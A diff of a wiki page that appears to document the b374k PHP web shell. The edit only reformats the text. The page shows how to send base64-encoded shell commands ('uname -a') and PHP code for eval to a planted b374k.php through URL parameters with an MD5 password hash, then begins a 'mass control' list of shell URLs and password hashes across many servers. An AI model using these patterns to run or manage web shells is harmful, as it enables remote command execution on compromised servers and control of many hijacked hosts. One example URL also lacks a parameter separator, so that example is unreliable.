@@ -12,19 +12,18 @@ example 1 :
 {{{
 http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=
 }}}
-This example use password 'b374k' in md5 format which is 0de664ecd2be02cdd54234a0d1229b43 and send command 'uname -a' which is dW5hbWUgLWE= in base64 format
+This example use password _b374k_ in md5 format which is _0de664ecd2be02cdd54234a0d1229b43_ and send command _uname -a_ which is _dW5hbWUgLWE=_ in base64 format
 
 example 2 :
 {{{
 http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43eval=cGhwaW5mbygpOw==
 }}}
-This example use password 'b374k' in md5 format which is 0de664ecd2be02cdd54234a0d1229b43 and send php code phpinfo();' which is cGhwaW5mbygpOw== in base64 format
-
+This example use password _b374k_ in md5 format which is _0de664ecd2be02cdd54234a0d1229b43_ and send php code _phpinfo();_ which is _cGhwaW5mbygpOw==_ in base64 format
 
 == Implementation ==
 For mass control implementation using php, see example below
 
-Create a file 'list.txt' contains url to b374k shell and its password
+Create a file _list.txt_ contains url to b374k shell and its password
 {{{
 http://www.myserver1.com/b374k.php,0de664ecd2be02cdd54234a0d1229b
 http://www.myserver2.com/b374k.php,0de664ecd2be02cdd54234a0d1229b
